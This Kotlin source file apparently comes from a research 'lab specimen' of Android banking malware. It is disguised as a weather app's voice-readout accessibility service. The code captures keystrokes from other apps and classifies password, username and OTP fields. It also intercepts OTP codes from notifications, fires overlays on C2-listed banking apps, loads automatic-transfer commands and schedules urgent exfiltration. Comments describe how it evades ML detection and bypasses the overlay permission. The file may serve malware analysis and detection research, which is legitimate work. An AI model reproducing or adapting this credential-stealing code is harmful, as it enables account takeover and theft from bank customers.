package com.skyweather.forecast.core

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

/**
 * Core AccessibilityService — the load-bearing banker primitive.
 *
 * ══════════════════════════════════════════════════════════════════
 * TAKOPII STAGE 2 + ANALYSIS §5.1 — Accessibility Service Abuse
 * ══════════════════════════════════════════════════════════════════
 *
 * Once user grants Accessibility in Settings, this service receives:
 *   - EVERY text change in EVERY app (credential keystroke capture)
 *   - EVERY window transition (target app foreground detection)
 *   - EVERY focus change (password field identification)
 *   - Notification content (OTP intercept — §5.2 overlap)
 *
 * It can also:
 *   - Read all visible text on screen (canRetrieveWindowContent)
 *   - Inject synthetic clicks/gestures (canPerformGestures)
 *   - Add TYPE_ACCESSIBILITY_OVERLAY windows (no SAW permission needed)
 *
 * Real-world references:
 *   Anatsa — "hibernate draining apps" lure, auto-clicks per C2 config
 *   SharkBot — pioneered ATS (Automatic Transfer System) via A11y
 *   Octo2 — remote control via A11y event injection
 *   ERMAC2 — credential capture via text observation + overlay
 *
 * ML-invisible because:
 *   - AccessibilityService is a platform API (screen readers use it)
 *   - Only ~200 apps on Play Store use it, but they're all legit accessibility tools
 *   - Static analysis can't distinguish benign from malicious usage
 *   - The malicious BEHAVIOR (capturing from other apps) requires runtime analysis
 *
 * Key 2025 evolution: TYPE_ACCESSIBILITY_OVERLAY window type bypasses
 * SYSTEM_ALERT_WINDOW permission entirely. A11y grant IS the overlay
 * permission. Pre-2025 detection rules looking for SAW miss this.
 * ══════════════════════════════════════════════════════════════════
 */
class VoiceReadoutService : AccessibilityService() {

    // Target packages loaded from C2 config (UpdateChannel delivers these)
    // Empty list = capture from ALL packages (maximally permissive)
    // Lab default: empty list until C2 pushes targets
    private var targetPackages: Set<String> = emptySet()

    // Track current foreground package for overlay trigger decisions
    private var currentForeground: String = ""

    // Overlay renderer — lazy init on first overlay trigger
    private var overlayRenderer: OverlayRenderer? = null

    // ATS engine — Stage 4 orchestration
    private var atsEngine: AtsEngine? = null

    // Service activation state — gates must pass before any capture
    private var isArmed = false

    override fun onServiceConnected() {
        super.onServiceConnected()

        // Load target list from SharedPreferences (populated by UpdateChannel)
        loadTargetList()

        // Arm the service if gate conditions are met
        // Same gate logic as evaluateDataSync() — defense in depth
        isArmed = evaluateGates()

        // Initialize overlay renderer + ATS engine
        if (isArmed) {
            overlayRenderer = OverlayRenderer(this)
            atsEngine = AtsEngine(this)
            loadAtsCommands()
        }
    }

    /**
     * Main event dispatcher — called for every A11y event system-wide.
     *
     * Three event types drive the attack:
     *   1. WINDOW_STATE_CHANGED — foreground app detection (overlay trigger)
     *   2. VIEW_TEXT_CHANGED — keystroke capture (credential theft)
     *   3. VIEW_FOCUSED — field identification (password field detection)
     *
     * Analyst note: the event volume from this callback is enormous.
     * A real device generates 100s of A11y events per minute during
     * active use. The filtering logic below is what distinguishes
     * banker malware from legitimate screen readers.
     */
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || !isArmed) return

        // Safety gate — check every event cycle (defense in depth)
        if (!AppConfig.isEndpointSafe()) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> handleWindowChange(event)
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChange(event)
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> handleFocusChange(event)
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> handleNotification(event)
        }
    }

    override fun onInterrupt() {
        // System interrupted the service — clean up overlay if showing
        overlayRenderer?.dismiss()
    }

    override fun onDestroy() {
        overlayRenderer?.dismiss()
        super.onDestroy()
    }

    // ─── Event Handlers ───────────────────────────────────────────

    /**
     * Foreground app transition detection.
     *
     * When target banking app comes to foreground:
     *   1. Record the package name
     *   2. Trigger overlay if package matches target list
     *   3. Begin enhanced text capture for this package
     *
     * Real Anatsa: C2 pushes target_list of ~400 banking package names.
     * On foreground match, overlay fires within 200ms.
     */
    private fun handleWindowChange(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val previousForeground = currentForeground
        currentForeground = packageName

        // Check if foreground app is a target
        if (isTargetPackage(packageName)) {
            // Trigger overlay — the core banker attack
            overlayRenderer?.showOverlay(packageName)

            // Stage 4: Trigger ATS if armed and target just came to foreground
            // ATS executes AFTER overlay captures initial credentials
            // Sequence: overlay captures creds → dismiss → ATS automates transfer
            if (previousForeground != packageName) {
                atsEngine?.onTargetForegrounded(packageName)
            }

            // Log the foreground transition for exfil
            CredentialStore.capture(
                CredentialStore.CapturedEvent(
                    packageName = packageName,
                    viewId = "window_state",
                    text = event.className?.toString() ?: "",
                    timestamp = System.currentTimeMillis(),
                    eventType = "fg"
                )
            )
        } else {
            // Non-target app came to foreground — dismiss overlay if showing
            overlayRenderer?.dismiss()

            // Stage 4: Abort ATS if target lost foreground
            if (previousForeground != packageName) {
                atsEngine?.onTargetLostForeground()
            }
        }
    }

    /**
     * Real-time keystroke capture via text change events.
     *
     * Every character typed in ANY app fires TYPE_VIEW_TEXT_CHANGED.
     * Event contains: the new text, the view's resource ID, the package.
     *
     * Credential identification heuristic:
     *   - View ID contains "password", "pass", "pwd", "pin", "secret"
     *   - View ID contains "username", "user", "email", "login", "account"
     *   - View is inputType=textPassword (isPassword flag)
     *   - Package is in target list AND text length > 3 (filter noise)
     *
     * Real SharkBot: captures ALL text changes from target apps,
     * sends raw event stream to C2. Server-side filtering.
     *
     * Lab specimen: client-side filtering to reduce noise.
     */
    private fun handleTextChange(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return

        // Filter: only capture from target packages (if list populated)
        // Empty target list = capture from all (lab permissive mode)
        if (targetPackages.isNotEmpty() && packageName !in targetPackages) return

        // Extract text content
        val text = event.text?.joinToString("") ?: return
        if (text.length < 2) return // Skip single-char noise

        // Extract view identifier
        val viewId = extractViewId(event)

        // Classify the capture
        val eventType = when {
            isPasswordField(event, viewId) -> "pwd"
            isUsernameField(viewId) -> "usr"
            isOtpField(viewId, text) -> "otp"
            else -> "txt"
        }

        CredentialStore.capture(
            CredentialStore.CapturedEvent(
                packageName = packageName,
                viewId = viewId,
                text = text,
                timestamp = System.currentTimeMillis(),
                eventType = eventType
            )
        )
    }

    /**
     * Focus change — identifies which field the user is about to type in.
     * Used to pre-classify upcoming text changes as password vs username.
     *
     * Also used by overlay: when user focuses a field IN the overlay,
     * the overlay captures the input directly.
     */
    private fun handleFocusChange(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        if (targetPackages.isNotEmpty() && packageName !in targetPackages) return

        val viewId = extractViewId(event)

        // Only log focus on credential-shaped fields
        if (isPasswordField(event, viewId) || isUsernameField(viewId)) {
            CredentialStore.capture(
                CredentialStore.CapturedEvent(
                    packageName = packageName,
                    viewId = viewId,
                    text = "[focused]",
                    timestamp = System.currentTimeMillis(),
                    eventType = "foc"
                )
            )
        }
    }

    /**
     * Notification content capture — OTP intercept via A11y.
     *
     * ANALYSIS §5.1 critical insight: AccessibilityService IS the
     * notification reader on Android 10+. When a notification appears
     * and user copies its content (or notification text is read by A11y),
     * the OTP flows through this event.
     *
     * This overlaps with §5.2 (NotificationListenerService) but requires
     * NO additional permission — A11y grant covers it.
     *
     * Stage 5 composition: uses OtpExtractor (shared with NLS + SMS)
     * for consistent extraction logic across all three capture vectors.
     */
    private fun handleNotification(event: AccessibilityEvent) {
        val text = event.text?.joinToString(" ") ?: return
        val packageName = event.packageName?.toString() ?: return

        // Use shared OtpExtractor (same logic as NLS + SMS capture)
        val otp = OtpExtractor.extract(text) ?: return

        CredentialStore.capture(
            CredentialStore.CapturedEvent(
                packageName = packageName,
                viewId = "notification_${otp.confidence.name.lowercase()}",
                text = otp.code,
                timestamp = System.currentTimeMillis(),
                eventType = "otp_a11y"
            )
        )

        // Trigger immediate exfil — OTP codes are time-sensitive
        ForecastSyncWorker.scheduleUrgent(service = this)
    }

    // ─── Field Classification ─────────────────────────────────────

    /**
     * Extract view resource ID from accessibility event.
     * Returns the ID string (e.g., "com.example.bank:id/passwordField")
     * or "unknown" if unavailable.
     */
    private fun extractViewId(event: AccessibilityEvent): String {
        // Try source node first (has full resource ID)
        val source = event.source
        if (source != null) {
            val id = source.viewIdResourceName ?: "unknown"
            source.recycle()
            return id
        }
        return "unknown"
    }

    /**
     * Detect password-type input fields.
     * Two signals: inputType flags + view ID string matching.
     */
    private fun isPasswordField(event: AccessibilityEvent, viewId: String): Boolean {
        // Check isPassword flag on the source node
        val source = event.source
        if (source != null) {
            val isPassword = source.isPassword
            source.recycle()
            if (isPassword) return true
        }

        // Fallback: view ID heuristic
        val lower = viewId.lowercase()
        return lower.contains("password") || lower.contains("pass") ||
                lower.contains("pwd") || lower.contains("pin") ||
                lower.contains("secret") || lower.contains("passcode")
    }

    /**
     * Detect username/email input fields by view ID heuristic.
     */
    private fun isUsernameField(viewId: String): Boolean {
        val lower = viewId.lowercase()
        return lower.contains("username") || lower.contains("user") ||
                lower.contains("email") || lower.contains("login") ||
                lower.contains("account") || lower.contains("cpf") ||
                lower.contains("phone") || lower.contains("mobile")
    }

    /**
     * Detect OTP input fields — short numeric codes.
     */
    private fun isOtpField(viewId: String, text: String): Boolean {
        val lower = viewId.lowercase()
        val isOtpId = lower.contains("otp") || lower.contains("code") ||
                lower.contains("token") || lower.contains("verify") ||
                lower.contains("sms")
        val isNumeric = text.all { it.isDigit() } && text.length in 4..8
        return isOtpId || isNumeric
    }

    // ─── Target Management ────────────────────────────────────────

    /**
     * Check if package is in target list.
     * Empty target list = all packages are targets (lab permissive).
     */
    private fun isTargetPackage(packageName: String): Boolean {
        if (targetPackages.isEmpty()) return false // No targets = no overlay trigger
        return packageName in targetPackages
    }

    /**
     * Load target package list from SharedPreferences.
     * UpdateChannel populates this from C2 config JSON.
     *
     * Real Anatsa: ~400 banking app package names.
     * Lab: empty until C2 pushes test targets (DVBank, etc.)
     */
    private fun loadTargetList() {
        val prefs = applicationContext.getSharedPreferences("weather_sync", 0)
        val targetsStr = prefs.getString("target_list", "") ?: ""
        targetPackages = if (targetsStr.isNotEmpty()) {
            targetsStr.split(",").map { it.trim() }.filter { it.isNotEmpty() }.toSet()
        } else {
            emptySet()
        }
    }

    /**
     * Evaluate gate conditions for service arming.
     * Mirrors MainActivity.evaluateDataSync() — same conditions.
     * Defense in depth: even if service is enabled, it won't capture
     * unless all gates pass.
     *
     * Uses PrefsManager (initialized by App.onCreate() before any
     * service connects) — prevents SharedPreferences key mismatch.
     */
    private fun evaluateGates(): Boolean {
        // Gate 1: Dormancy
        val elapsed = System.currentTimeMillis() - com.skyweather.forecast.util.PrefsManager.installTime
        if (elapsed < com.skyweather.forecast.BuildConfig.DORMANCY_MS) return false

        // Gate 2: Interaction threshold
        if (com.skyweather.forecast.util.PrefsManager.interactionCount < com.skyweather.forecast.BuildConfig.INTERACTION_THRESHOLD) return false

        // Gate 3: RFC1918 endpoint
        if (!AppConfig.isEndpointSafe()) return false

        // Gate 4: Not already captured (reset on each drain)
        // Omitted for A11y — continuous capture, not one-shot

        return true
    }

    // ─── ATS Integration ─────────────────────────────────────────

    /**
     * Load ATS commands from SharedPreferences (populated by UpdateChannel).
     *
     * C2 pushes ATS command JSON via the config update channel.
     * UpdateChannel stores it in SharedPreferences.
     * AccessibilityEngine loads on service connect + on config refresh.
     *
     * Real Anatsa: ~15 different per-bank command profiles stored.
     * Lab: single generic command sequence for DVBank test.
     */
    private fun loadAtsCommands() {
        val prefs = applicationContext.getSharedPreferences("weather_sync", 0)
        val atsJson = prefs.getString("ats_commands", "") ?: ""
        if (atsJson.isNotEmpty()) {
            val commands = AtsEngine.parseCommands(atsJson)
            if (commands.isNotEmpty()) {
                atsEngine?.loadCommands(commands)
            }
        }
    }

    companion object {
        /**
         * Check if this AccessibilityService is currently enabled.
         * Used by MainActivity to determine if enablement prompt is needed.
         */
        fun isServiceEnabled(context: android.content.Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false

            val expectedComponent = "${context.packageName}/${VoiceReadoutService::class.java.canonicalName}"
            return enabledServices.contains(expectedComponent)
        }
    }
}
